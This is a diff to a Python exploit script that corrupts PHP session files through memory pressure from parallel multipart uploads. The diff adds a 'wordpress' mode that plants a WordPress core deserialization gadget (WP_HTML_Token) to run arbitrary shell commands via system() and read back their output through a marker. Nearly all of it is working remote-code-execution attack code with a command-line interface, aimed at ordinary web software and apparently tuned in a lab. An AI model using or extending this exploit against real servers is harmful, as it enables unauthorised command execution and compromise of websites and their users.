@@ -52,6 +52,7 @@ import lab
 # in poc/charge_trace.py), and fewer of them shrinks that unmeasured term
 # and the pressure band's spread.
 N_FILLERS = 4
+ACTIVE_FILLERS = N_FILLERS    # per-chain override (wordpress uses 8)
 F_MAX = 7_000_000              # per-filler field bytes (body < post_max_size)
 P_CARRIER_PROGRESS = 336       # carrier progress record length (fixed layout)
 P_START = P_CARRIER_PROGRESS + len(b"bio|s:") + len(str(lab.L1)) + len(':"')
@@ -59,6 +60,8 @@ H_MIN, H_MAX = 0, 28_000_000   # pressure bracket bounds (h + 4 fillers
                                # must fit below post_max_size)
 FAST_EOF_BOOTSTRAP_MS = 450.   # early/late split until this run has seen
                                # enough deaths to calibrate its own
+WP_MARKER: str | None = None   # set by exploit() in 'wordpress' chain
+                               # mode: success marker echoed by system()
 
 
 # ------------------------------------------------------------------ HTTP I/O
@@ -78,7 +81,7 @@ def filler_open(host: str, port: int) -> list[socket.socket]:
     """
     socks = []
     b = lab.BOUNDARY
-    for i in range(N_FILLERS):
+    for i in range(ACTIVE_FILLERS):
         head = (
             f"POST /index.php HTTP/1.1\r\nHost: {host}\r\n"
             f"Content-Type: multipart/form-data; boundary={b}\r\n"
@@ -159,8 +162,12 @@ def _dechunk(data: bytes) -> bytes:
 
 def http_get(host: str, port: int, path: str, sid: str | None = None,
              timeout: float = 15.0) -> bytes:
+    # Host must carry the port for non-standard ports (RFC 7230): without
+    # it WordPress canonical-redirects (301, empty body) and the response
+    # looks like a dead server to wait_server/consumer.
+    host_hdr = host if port == 80 else f"{host}:{port}"
     extra = f"Cookie: PHPSESSID={sid}\r\n" if sid else ""
-    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n{extra}"
+    req = (f"GET {path} HTTP/1.1\r\nHost: {host_hdr}\r\n{extra}"
            f"Connection: close\r\n\r\n").encode()
     s = _conn(host, port)
     s.sendall(req)
@@ -187,6 +194,10 @@ def consumer(host: str, port: int, sid: str, tries: int = 6) -> bytes:
     """GET the consumer page with our sid - the request that makes the
     decoder materialise the planted object and fire its gadget.
 
+    Requests '/' (not /index.php): WordPress canonical-redirects
+    /index.php to / with an empty body, which would look like a dead
+    server. '/' works on every target (DirectoryIndex).
+
     The response body carries the only textual natural signal: PHP's
     "Failed to decode" warning when the file is structurally broken.
     Retried through a target restart (the file survives any process
@@ -194,7 +205,7 @@ def consumer(host: str, port: int, sid: str, tries: int = 6) -> bytes:
     """
     for _ in range(tries):
         try:
-            body = http_get(host, port, "/index.php", sid=sid)
+            body = http_get(host, port, "/", sid=sid)
         except OSError:
             time.sleep(0.75)
             continue
@@ -252,7 +263,7 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int,
 
     fillers = filler_open(host, port)
     time.sleep(0.4)
-    pushed = filler_push(fillers, h // N_FILLERS)
+    pushed = filler_push(fillers, h // ACTIVE_FILLERS)
     res["pushed"] = pushed
     time.sleep(0.4)                 # let the charge settle before the victim
 
@@ -281,11 +292,25 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int,
     res["decode_failed"] = b"Failed to decode" in body
     res["consumer_ok"] = bool(body)
 
-    # The only positive signal: this run's random shell.
-    out = probe(host, port, cmd)
-    res["hit"] = bool(out)
-    if out:
-        res["output"] = out.decode(errors="replace")
+    if WP_MARKER:
+        # Output-based chain (system() from __destruct at shutdown):
+        # the command output + marker are appended to THIS response, so
+        # the consumer body itself is the positive signal - no shell
+        # file exists anywhere in this mode.
+        if WP_MARKER.encode() in body:
+            tail = body.rsplit(b"</html>", 1)[-1]
+            res["output"] = tail.replace(WP_MARKER.encode(), b"",
+                                         1).strip().decode(errors="replace")
+            res["hit"] = True
+        else:
+            res["hit"] = False
+    else:
+        # FileCache mode: the only positive signal is this run's random
+        # shell (a stale shell can never fake a hit).
+        out = probe(host, port, cmd)
+        res["hit"] = bool(out)
+        if out:
+            res["output"] = out.decode(errors="replace")
 
     for s in [carrier, victim]:
         try:
@@ -349,17 +374,33 @@ def _derive(res: dict, eof_times: list[float]) -> tuple[str, float]:
 
 
 def exploit(host: str, port: int, command: str, max_attempts: int = 40,
-            verbose: bool = True) -> dict:
+            verbose: bool = True, chain: str = "filecache") -> dict:
     lab.set_geometry("big")     # victim RSS must beat the apache master
     lab.HOST, lab.PORT = host, port
     lab.set_shell(lab.new_shell_name())   # per-run shell: no stale hits
+    global WP_MARKER, ACTIVE_FILLERS
+    if chain == "wordpress":
+        # Real WordPress core gadget (WP_HTML_Token): its __destruct
+        # runs "<command>;echo <marker>" via system(); the marker in
+        # the consumer response is the positive signal. No shell file.
+        WP_MARKER = f"PWNED{random.randrange(1 << 40):010x}"
+        lab.set_gadget("wordpress", f"{command};echo {WP_MARKER}")
+        # WP's resting charge (small pool + ~20MiB code cache) pushes
+        # the landable band up to h in (32, 40): 8 fillers give a
+        # 56MiB pressure range and an 8MiB-wide band (vs jitter ~2MiB).
+        ACTIVE_FILLERS = 8
+    else:
+        WP_MARKER = None
+        lab.set_gadget("filecache")
+        ACTIVE_FILLERS = N_FILLERS
     c_len = P_START + lab.L1 + 2
     r_len = (len(lab.r_prefix()) + lab.LEN2 + len(lab.r_suffix())
              + lab.L1 + 17)
     if verbose:
         print(f"[*] target {host}:{port}  |C|={c_len} |R|={r_len} "
               f"window=[{lab.f_offset()}, {lab.e_offset()}) "
-              f"k_target={lab.k_target()} shell={lab.shell_path()}")
+              f"k_target={lab.k_target()} chain={chain} "
+              f"shell={lab.shell_path()}")
 
     # Pre-loaded pressure H (anonymous, held in PHP's multipart parser).
     # The pre-victim state (baseline + filler runtimes + file cache)
@@ -369,11 +410,13 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
     # once narrow, SAMPLE the band - within it the landing is stochastic.
     h = 16_000_000
     h_min, h_max = H_MIN, H_MAX
+    if chain == "wordpress":
+        h_max = 56_000_000       # 8 fillers x 7MiB (see ACTIVE_FILLERS)
     lo, hi = h_min, h_max      # bracket around the landable pressure
-    MIN_W = 4_000_000          # never sample narrower than half the
-                               # k-window's width in h units - the
-                               # pre-victim state jitters ~1-2MiB and
-                               # slides the window under a fixed h
+    # Never sample narrower than the band: the bare-app targets have a
+    # wide band (4MiB); WordPress's landable slice sits under ~1MiB
+    # (its heavy baseline pushes the band down to h in (0, ~1M)).
+    MIN_W = 1_000_000 if chain == "wordpress" else 4_000_000
     last_signal = None         # "early" = too high | "low" = too low
     eof_times: list[float] = [] # this run's victim death times (calibration)
 
@@ -450,6 +493,10 @@ def main() -> int:
                    help="shell command to run on the target")
     p.add_argument("--attempts", type=int, default=40,
                    help="maximum interruption attempts (default 40)")
+    p.add_argument("--chain", choices=("filecache", "wordpress"),
+                   default="filecache",
+                   help="planted gadget: the lab's FileCache (default) "
+                        "or the real WordPress core chain (WP_HTML_Token)")
     p.add_argument("-q", "--quiet", action="store_true")
     a = p.parse_args()
 
@@ -460,7 +507,8 @@ def main() -> int:
     host, _, port = hostport.partition(":")
     port = int(port or 80)
 
-    res = exploit(host, port, a.command, a.attempts, verbose=not a.quiet)
+    res = exploit(host, port, a.command, a.attempts,
+                  verbose=not a.quiet, chain=a.chain)
     if res.get("error"):
         print(f"[!] {res['error']}")
         return 2
